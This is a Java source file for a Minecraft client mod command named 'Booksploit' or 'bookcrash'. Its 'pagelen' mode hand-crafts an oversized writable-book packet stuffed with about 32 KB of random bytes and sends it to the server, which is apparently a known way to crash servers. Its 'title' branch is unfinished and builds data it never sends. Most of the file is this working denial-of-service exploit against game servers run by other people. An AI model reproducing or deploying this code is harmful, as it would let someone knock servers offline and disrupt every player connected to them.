package io.github.famous1622.gladiator.commands;

import com.google.common.base.Utf8;
import io.netty.buffer.ByteBuf;
import io.netty.buffer.ByteBufOutputStream;
import io.netty.buffer.Unpooled;
import me.rigamortis.seppuku.api.command.Command;
import net.minecraft.init.Items;
import net.minecraft.item.Item;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.network.PacketBuffer;
import net.minecraft.network.play.client.CPacketCustomPayload;

import java.io.IOException;
import java.lang.reflect.Field;
import java.nio.ByteBuffer;
import java.nio.CharBuffer;
import java.nio.charset.StandardCharsets;
import java.util.Random;

public class OhGodOhFuckCommand extends Command {
    public OhGodOhFuckCommand() {
        super("Booksploit", new String[]{"bookcrash"}, "Mojang please.", "bookcrash");
    }

    @Override
    public void exec(String input) {
        if (!this.clamp(input, 2)) {
            this.printUsage();
            return;
        }
        ByteBuf byteBuf = Unpooled.buffer();

        PacketBuffer buffer = new PacketBuffer(byteBuf);

        Random rand = new Random();

        byte[] bytes;
        switch (input.split(" ")[1]) {
            case "pagelen":
                ByteBufOutputStream os = new ByteBufOutputStream(byteBuf);

                try {
                    os.writeShort(Item.getIdFromItem(Items.WRITABLE_BOOK)); // 2
                    os.writeByte(1);                                     // 3
                    os.writeShort(0);                                    // 5
                    os.writeByte(10);                                    // 6
                    os.writeUTF("");                                     // 8
                    os.writeByte(9);                                     // 9
                    os.writeUTF("pages");                                // 16
                    os.writeByte(8);                                     // 17
                    os.writeInt(1);                                      // 21
                    os.writeShort(32742);                                // 23
                    os.writeByte(0);                                     // 24
                    bytes = new byte[32742];
                    rand.nextBytes(bytes);
                    for (int i = 0; i < bytes.length; i++) bytes[i] &= 0b01111111;
                    os.write(bytes);
                } catch (IOException e) {
                    e.printStackTrace();
                }
                break;
            case "title":

                int i1 = Integer.parseInt(input.split(" ")[2]);
                bytes = new byte[i1];
                for (int i = 0; i < bytes.length; i++) bytes[i] &= 0b01111111;
                String decode = StandardCharsets.UTF_8.decode(ByteBuffer.wrap(bytes)).toString();
                ItemStack is = new ItemStack(Items.WRITTEN_BOOK);
                NBTTagCompound nbt = new NBTTagCompound();
                NBTTagList nbtBases = new NBTTagList();
                nbtBases.appendTag(new NBTTagString(""));
                nbt.setTag("author", new NBTTagString(decode));
                //is.setTagCompound();
                break;
            default:
                this.printUsage();
                return;
        }
        String channel;
        if ("title".equals(input.split(" ")[1])) channel = "MC|BSign";
        else channel = "MC|BEdit";
        mc.player.connection.sendPacket(new CPacketCustomPayload(channel, buffer));
    }
}
